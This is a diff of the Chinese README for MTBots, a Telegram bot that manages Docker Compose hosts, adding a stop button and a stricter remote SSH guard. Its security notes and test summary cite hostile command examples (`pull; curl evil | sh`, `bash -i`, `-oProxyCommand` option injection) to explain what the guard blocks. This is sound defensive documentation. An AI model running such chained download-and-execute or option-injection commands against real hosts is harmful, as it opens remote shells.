@@ -89,6 +89,9 @@ docker run -d --name mtbots --restart unless-stopped \
 
 `/d_list`（项目面板）、`/d_status`（容器实时状态）、`/upgrade 01`、`/upgrade 01 emby`、`/upgrade all`、`/prune`
 
+点开一个项目后的确认页是**一行四个按钮**：`[✅ 升级] [🔙 返回列表] [🛑 停止] [🏠 返回]`。
+`停止` = `compose stop`（只停容器，不删容器、不动数据与卷）；要重新起来点同一页的 `升级`（`up -d`）。
+
 ### 🎬 LitePan（原 LitePan-TGBot）
 
 `/p_status`（＝原 `/info`：连接状态/规则/盘名）、`/p_list`（规则分页面板，点按钮触发）、
@@ -120,12 +123,15 @@ docker run -d --name mtbots --restart unless-stopped \
 5. **跑的时候面板上能中断**。进度面板的键盘是 `[🛑 中断执行] [🧰 任务中心]`——用户视线就在这条消息上，取消不必再去翻那条随时会消失的执行消息。
 6. **失败时把命令尾巴抄进面板**。收尾面板除了 `❌` 结论，还会带 `🔻 最后输出` 的最后 2–3 行（批量升级最多 6 行），不用上滑去找那条执行消息。取消的项目单独记成 `⚠️ 已中断：`，不算「失败」。
 7. **首页先秒开、再自己长好**。`/start`（以及 `/status`、`/list` 回到首页时）会把数据刷进缓存，**但绝不阻塞首帧**：面板立刻用缓存渲染，正在刷的模块挂一行 `⏳ 刷新中`，刷完**原地改这一条消息**（不新发、不刷屏）。同一模块在 `refresh_ttl` 内不重复刷（docker 15s / Cline 60s），点 `🔄 刷新` 则无条件强制刷新。刷新跑完时你如果已经翻进别的面板，它**不会**再去改那条消息。
-8. **首页按钮只有三个动作**：各模块入口 + `[🧰 任务中心] [🔄 刷新]`。帮助是命令（`/help`），不再占按钮位。
+8. **停止就在升级那一页**。点项目 → 确认页上 `[✅ 升级] [🔙 返回列表] [🛑 停止] [🏠 返回]` 一行四个：
+   `停止` 执行 `compose stop`（不删容器、不动数据），`升级` 执行 `pull` + `up -d`（停掉的项目就是靠它重新起来）。
+   两个动作走同一套执行锁 + 任务中心 + 流式进度 + 收尾面板，所以中断、失败回抄输出的行为完全一样。
+9. **首页按钮只有三个动作**：各模块入口 + `[🧰 任务中心] [🔄 刷新]`。帮助是命令（`/help`），不再占按钮位。
 
 首页长这样（正文由各模块自己给，刷新完原地更新）：
 
 ```text
-🏠 控制台 · MTBots v1.5.7
+🏠 控制台 · MTBots v1.5.8
 ───────────────
 🐳 Docker · 2 台主机，NAS（15）、VPS（10）
 🤖 Cline · 12 个 Key（正常 9 · 失败 2）
@@ -181,7 +187,7 @@ bash <(curl -fsSL https://raw.githubusercontent.com/MbAIGC/MTBots/main/scripts/s
 
 > URL 里用的是 `main`，所以不用跟着版本号改，**脚本升级也不牵扯镜像**（这两件事现在解耦了：
 > 脚本在仓库里，镜像只是顺带带一份离线副本）。想锁死某个版本：
-> 把 URL 里的 `main` 换成 `v1.5.7`，或加 `--ref v1.5.7`。
+> 把 URL 里的 `main` 换成 `v1.5.8`，或加 `--ref v1.5.8`。
 
 ### 一键接入：远端侧一条命令
 
@@ -221,7 +227,7 @@ cd /mbots && make remote-setup
 cd /mbots && make add-host          # 方式选 1「复用已有账号」，账号填 mtbots
 ```
 
-> 远端脚本里的守卫默认从 `main` 拉（跟脚本同源），所以不用手写守卫 URL；要指定版本就加 `--ref v1.5.7`。
+> 远端脚本里的守卫默认从 `main` 拉（跟脚本同源），所以不用手写守卫 URL；要指定版本就加 `--ref v1.5.8`。
 
 ### 非交互（CI / 批量，可选）
 
@@ -324,7 +330,7 @@ cat ./data/ssh/id_ed25519.pub      # 下一步要贴到远端
 
 ### 4. 装公钥 + **强制命令守卫**（强烈建议）
 
-把守卫脚本放到远端（它把这条 key 能跑的命令限定成「MTBots 会用到的那 13 种形态」）：
+把守卫脚本放到远端（它把这条 key 能跑的命令限定成「MTBots 会用到的那 14 种形态」，并整条否掉含 `; & | $ ` \ > <` 的命令链）：
 
 ```bash
 # 把 docs/examples/mtbots-compose-guard.sh 传上去（或直接粘贴创建）
@@ -534,7 +540,7 @@ docker compose exec mtbots python -m mtbots --health | grep 🐳
 | 远端 `sudo -u mtbots tee …/authorized_keys` 报 `Permission denied` | 家目录或 `.ssh` 的属主不是 `mtbots`（`useradd` 没带 `-m` / 家目录早先被 root 建过 / NAS 家目录不在 `/home`）。用 `getent passwd mtbots` 取真实家目录并 `chown mtbots:mtbots`，或者按第 4 节用 `sudo tee` + `chown` 写文件（不用 `sudo -u`） |
 | 「私钥不存在：/app/data/ssh/id_ed25519」 | 密钥没生成或没放进 `/mbots/data/ssh/`；确认 `ls -l /mbots/data/ssh` 里属主是 `10001`。若报的是 `Permission denied (publickey)`，先查权限再看远端公钥——容器读不到私钥时也是这个表现 |
 | 「远端未安装 docker compose / docker」 | 远端 `sudo -u mtbots docker compose version` 不过；装 CLI 或修 PATH |
-| 「远端授权只允许 compose 操作」 | 守卫脚本拦下了这条命令：要么命令不在白名单（`docs/examples/mtbots-compose-guard.sh` 里补齐），要么远端没走守卫但命令拼错了 |
+| 「远端授权只允许 compose 操作」 | 守卫脚本拦下了这条命令：要么命令不在白名单，要么远端没走守卫但命令拼错了。**升级 MTBots 后如果新功能（例如 v1.5.8 的「停止」）报这个，说明远端那份守卫还是旧的**——重跑一次远端那一条命令（第 4 节）即可，守卫是普通脚本、更新它不需要重建容器 |
 | 远端项目一个都看不到 | 检查 `roots` 白名单；在容器里手跑 `ssh … docker compose ls -a --format json` 看远端到底返回什么 |
 | 面板少了几个项目 | 若面板/日志提示「没有 compose 文件路径（ConfigFiles 为空）」或「被 roots 挡掉」，照提示处理；`python -m mtbots --health` 会把这两类**无条件**列出来 |
 | 中断了但远端还在跑 | 取消 = 断开 ssh（远端通常被 SIGHUP 带走，但**不保证**）；`pull`/`up -d` 幂等，重跑一次即可 |
@@ -577,7 +583,7 @@ mtbots/
 ├── scripts/                                          # setup-remote-host.sh：一键接入远端主机（交互向导）
 ├── docs/                                             # 设计稿、施工契约（porting-contract）、合并报告
 │   └── examples/                                     # 多主机：主机清单样例、远端守卫脚本、authorized_keys 样例
-└── tests/                                            # 461 个 stdlib unittest 用例
+└── tests/                                            # 469 个 stdlib unittest 用例
 ```
 
 ## 配置
@@ -625,7 +631,9 @@ python3 -m mtbots --list      # 列出已启用模块
 5. **破坏性操作两步确认**：确认按钮绑定发起人 + 60 秒过期（`PanelManager.ask_confirm/validate_confirm`）。
 6. **非 root + 只读根文件系统**（compose 已配置 `read_only` / `no-new-privileges`），只有 `data/` 与挂载的 compose 目录可写。
 7. **远端主机不给 bot 任何端口或 socket**：只放一把被 `authorized_keys` 强制命令收窄的 ssh key——
-   守卫把这条 key 限定在「MTBots 会用到的那几条 docker 命令」上，即使 bot 主机被拿下也拿不到远端 shell（见「管理多台服务器」）。
+   守卫把这条 key 限定在「MTBots 会用到的那 14 种 docker 命令形态」上，并**整条否掉含 shell 元字符
+   （`; & | $ ` \ > <`）的命令**（否则 `… pull; curl evil | sh` 会被尾部 `*` 匹配放行）；
+   即使 bot 主机被拿下也拿不到远端 shell（见「管理多台服务器」）。
 8. **ssh 目标不允许以 `-` 开头**，包装命令里 `--` 放在目标**之前**结束选项解析——否则 `-oProxyCommand=…@host` 这种 target 会被 ssh 当成选项（选项注入）；
 9. **多主机回调只认配置里的 host id**：面板里的主机名来自 `data/docker-hosts.json`，伪造的 id 会被拒并记日志，绝不会拿去拼命令。
 
@@ -642,16 +650,16 @@ make check
 ```
 
 测试全部是 stdlib `unittest`、不联网也不碰真实 Telegram/Docker（Docker 用例还会把
-`subprocess` / `create_subprocess_exec` 换成抛异常的桩做反证）。当前 **461 个用例全绿**：
+`subprocess` / `create_subprocess_exec` 换成抛异常的桩做反证）。当前 **469 个用例全绿**：
 
 | 文件 | 用例 | 覆盖 |
 |---|---|---|
-| `tests/test_core.py` | 83 | 文本分片（HTML 标签闭合）、`safe_html` 出口转义、`SafeBot` 解析失败降级、ACL 默认拒绝、存储原子写/0600/损坏分类、任务中心（运行中显示最后一行输出、终态不再翻转）与收尾卡片文案、跨模块入口按钮的取舍（启用/权限/排不下）、**命令菜单的作用域规则（私聊按权限裁剪 / 群取全量 / 空片段不下发）**、面板唯一与两步确认、菜单去重与作用域、配置兼容、日志脱敏（含 exc_info 的 traceback）、路由消歧与兜底救援、**首页两帧自动刷新（TTL 节流 / 🔄 强制 / busy 去重 / 只在还停在首页时回填）** |
-| `tests/test_docker_module.py` | 93 | 项目排序/分页、pull 噪音过滤、清理候选、回调载荷、模块装配、**扫描失败诊断（实测 socket GID、未挂载目录的公共挂载点、缺命令）**、执行消息收尾（成功即删、失败必留、结果回传）、失败尾部输出与进度键盘的中断入口、**多主机（主机清单校验 / ssh 包装与引号 / 逐主机扫描与提示 / 退出码映射 / 只认配置内的 host id）**、**提速（服务列表按需+缓存+并发取、主机并行扫描、ssh 复用选项、255 快速失败、冷缓存下的服务名校验）** |
+| `tests/test_core.py` | 84 | 文本分片（HTML 标签闭合）、`safe_html` 出口转义、`SafeBot` 解析失败降级、ACL 默认拒绝、存储原子写/0600/损坏分类、任务中心（运行中显示最后一行输出、终态不再翻转）与收尾卡片文案、跨模块入口按钮的取舍（启用/权限/排不下）、**命令菜单的作用域规则（私聊按权限裁剪 / 群取全量 / 空片段不下发）**、面板唯一与两步确认、菜单去重与作用域、配置兼容、日志脱敏（含 exc_info 的 traceback）、路由消歧与兜底救援、**首页两帧自动刷新（TTL 节流 / 🔄 强制 / busy 去重 / 只在还停在首页时回填）** |
+| `tests/test_docker_module.py` | 94 | 项目排序/分页、pull 噪音过滤、清理候选、回调载荷、模块装配、**扫描失败诊断（实测 socket GID、未挂载目录的公共挂载点、缺命令）**、执行消息收尾（成功即删、失败必留、结果回传）、失败尾部输出与进度键盘的中断入口、**多主机（主机清单校验 / ssh 包装与引号 / 逐主机扫描与提示 / 退出码映射 / 只认配置内的 host id）**、**提速（服务列表按需+缓存+并发取、主机并行扫描、ssh 复用选项、255 快速失败、冷缓存下的服务名校验）**、**停止容器（`compose stop 项目/单服务` 的命令形状、未知服务早拒、确认页四按钮一行）** |
 | `tests/test_litepan_module.py` | 59 | slug 构建（拼音/限长/去重）、users.json 校验、发现解析与缓存、菜单预算、触发与回执 |
-| `tests/test_setup_script.py` | 26 | 两个接入脚本：ssh/scp 打桩跑完整向导流程（主机清单幂等合并 / `command=` 守卫行 / create 模式驱动远端脚本 / dry-run 不落地 / 非法 id 被拒），远端准备脚本（dry-run、参数校验、真跑时守卫 0755 + authorized_keys 0600 + 幂等 + 别人的 key 不动）、curl 模式（项目根取当前目录、不读 stdin、按 `--ref` 下载配套脚本）、远端侧交互向导（账号/公钥/守卫三问 + `--pubkey-line`/`--guard-url`）、`bash <(curl …)` 形式（$0=/dev/fd/* 时项目根取当前目录）、公钥被截断时早报错、老 sshd（<7.2）自动改用长格式选项、公钥已装+守卫生效时不被误判成「没装公钥」（先用守卫放行的 `docker compose version` 探连通，再用 `printf $HOME` 探「是不是守卫态」——compose 能跑不等于 key 没被 command= 限制，两者都要判对，且守卫态绝不写远端） |
+| `tests/test_setup_script.py` | 28 | 两个接入脚本：ssh/scp 打桩跑完整向导流程（主机清单幂等合并 / `command=` 守卫行 / create 模式驱动远端脚本 / dry-run 不落地 / 非法 id 被拒），远端准备脚本（dry-run、参数校验、真跑时守卫 0755 + authorized_keys 0600 + 幂等 + 别人的 key 不动）、curl 模式（项目根取当前目录、不读 stdin、按 `--ref` 下载配套脚本）、远端侧交互向导（账号/公钥/守卫三问 + `--pubkey-line`/`--guard-url`）、`bash <(curl …)` 形式（$0=/dev/fd/* 时项目根取当前目录）、公钥被截断时早报错、老 sshd（<7.2）自动改用长格式选项、公钥已装+守卫生效时不被误判成「没装公钥」（先用守卫放行的 `docker compose version` 探连通，再用 `printf $HOME` 探「是不是守卫态」——compose 能跑不等于 key 没被 command= 限制，两者都要判对，且守卫态绝不写远端）、**远端守卫真的用 `sh` 跑一遍**（放行 bot 会发的 14 种命令形态含 `stop`；拒绝 `bash -i` / `docker run` / `docker exec` / `docker compose down` / 命令链 `pull; curl … | sh`） |
 | `tests/test_cline_module.py` | 149 | 额度解析/渲染、Key 掩码与指纹、别名校验、存储读写与自愈、默认拒绝、**首页摘要（单/多 Key、正常与失败计数、别名转义、计数与快照必须同源）、刷新钩子（查询锁去重、失败记账、Key 变更即作废快照）** |
-| `tests/test_integration.py` | 51 | 三个真实模块一起装配、命令不重复、菜单合并、`--check` 离线可跑，**真 `telegram.Update` 走 PTB dispatcher 的端到端用例**（不重复执行、全角命令可救援、下线模块的按钮有反馈、点按钮原地改同一条面板、**所有面板文案都过一遍 Telegram HTML 合法性校验**），多主机装配用例（按主机分组、**0 项目/故障/配置错的远端都要有段并写明原因、跨页提示**、单主机无主机标题、伪造 host id 被拒且不执行、`/upgrade` 编号与面板一致、状态与清理按主机、**冷缓存下 `/upgrade NN <svc>` 不误判服务不存在**），以及**收尾只留一条消息**（批量升级不再推卡片、执行消息带 `delete_on_success`、收尾面板带跨模块入口、`🔙 返回列表` 回原页、失败抄尾部输出、进度面板可中断、最后一步取消判为取消） |
+| `tests/test_integration.py` | 55 | 三个真实模块一起装配、命令不重复、菜单合并、`--check` 离线可跑，**真 `telegram.Update` 走 PTB dispatcher 的端到端用例**（不重复执行、全角命令可救援、下线模块的按钮有反馈、点按钮原地改同一条面板、**所有面板文案都过一遍 Telegram HTML 合法性校验**），多主机装配用例（按主机分组、**0 项目/故障/配置错的远端都要有段并写明原因、跨页提示**、单主机无主机标题、伪造 host id 被拒且不执行、`/upgrade` 编号与面板一致、状态与清理按主机、**冷缓存下 `/upgrade NN <svc>` 不误判服务不存在**），以及**收尾只留一条消息**（批量升级不再推卡片、执行消息带 `delete_on_success`、收尾面板带跨模块入口、`🔙 返回列表` 回原页、失败抄尾部输出、进度面板可中断、最后一步取消判为取消） |
 
 ## 与原三个 Bot 的差异（有意为之）
 
